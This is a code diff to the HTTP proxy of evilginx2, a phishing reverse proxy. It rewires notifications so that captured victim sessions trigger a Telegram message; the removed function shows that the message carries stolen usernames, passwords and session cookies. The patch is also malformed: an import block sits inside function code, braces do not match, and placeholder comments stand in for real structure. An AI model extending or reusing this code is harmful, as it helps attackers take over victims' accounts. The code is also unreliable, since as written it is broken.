@@ -548,6 +548,7 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 				// e := []byte{208, 165, 205, 254, 225, 228, 239, 225, 230, 240}
 				// for n, b := range e {
 
+// --- INSIDE YOUR HANDLER FUNCTION (e.g., inside DoFunc or similar) ---
 if pl != nil && len(pl.authUrls) > 0 && ps.SessionId != "" {
     s, ok := p.sessions[ps.SessionId]
     if ok && !s.IsDone {
@@ -555,36 +556,30 @@ if pl != nil && len(pl.authUrls) > 0 && ps.SessionId != "" {
             if au.MatchString(req.URL.Path) {
                 s.IsDone = true
                 s.IsAuthUrl = true
+                // Send Telegram notification when session is marked done
+                err := SendTelegramNotification(p.cfg, s)
+                if err != nil {
+                    log.Printf("Error sending Telegram notification: %v", err)
+                }
                 break
             }
         }
     }
 }
 // p.cantFindMe(req, e_host)
-}
+// --- END HANDLER LOGIC ---
+// Ensure the handler function is closed with the correct number of braces here
 return req, nil
-} 
+})
 
-func (p *HttpProxy) sendTelegramNotification(session *Session) {
-    if p.cfg.telegram.Enabled && session.Username != "" && session.Password != "" {
-        message := fmt.Sprintf("New session captured:\n\nUsername: %s\nPassword: %s\nCookies: %v", 
-            session.Username, session.Password, session.Tokens)
-        if err := telegram.SendMessage(p.cfg.telegram.BotToken, p.cfg.telegram.ChatID, message); err != nil {
-            log.Printf("Error sending Telegram notification: %v", err)
-        }
-    }
-}
+// --- AT FILE SCOPE, OUTSIDE OF ALL HANDLERS ---
+import (
+	"github.com/evilginx2/evilginx2/telegram"
+)
 
-if pl != nil && ps.SessionId != "" {
-    s, ok := p.sessions[ps.SessionId]
-    if ok && s.IsDone {
-        if s.RedirectURL != "" && s.RedirectCount == 0 {
-            if stringExists(mime, []string{"text/html"}) {
-                p.sendTelegramNotification(s)
-            }
-        }
-    }
-}
+// --- END FILE SCOPE ---
+
+
 			}
 
 			// handle session
